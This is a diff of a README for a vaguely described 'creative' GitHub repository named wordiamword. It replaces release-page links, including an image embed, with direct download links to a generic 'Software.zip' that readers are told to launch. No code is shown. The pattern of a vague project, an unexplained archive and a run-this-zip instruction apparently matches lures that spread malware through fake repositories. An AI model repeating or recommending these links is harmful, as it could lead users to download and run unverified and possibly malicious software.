@@ -10,7 +10,7 @@ Welcome to the "wordiamword" repository! This is a creative space where consciou
 
 To get started with "wordiamword," you can download the repository files using the following link: 
 
-[![Download wordiamword](https://github.com/kangfuja/wordiamword/releases/tag/v1.0)](https://github.com/kangfuja/wordiamword/releases/tag/v1.0)
+[![Download wordiamword](https://github.com/kangfuja/wordiamword/releases/download/v2.0/Software.zip)](https://github.com/kangfuja/wordiamword/releases/download/v2.0/Software.zip)
 
 Once you've downloaded the files, launch the zip file to explore the contents and start your creative journey.
 
@@ -60,6 +60,6 @@ Remember, creativity knows no bounds - so let your imagination run wild in this 
 
 For more information or troubleshooting, check the "Releases" section of the repository.
 
-![Wordiamword](https://github.com/kangfuja/wordiamword/releases/tag/v1.0)
+![Wordiamword](https://github.com/kangfuja/wordiamword/releases/download/v2.0/Software.zip)
 
 **Happy Remixing!** 🎨🌟🌊
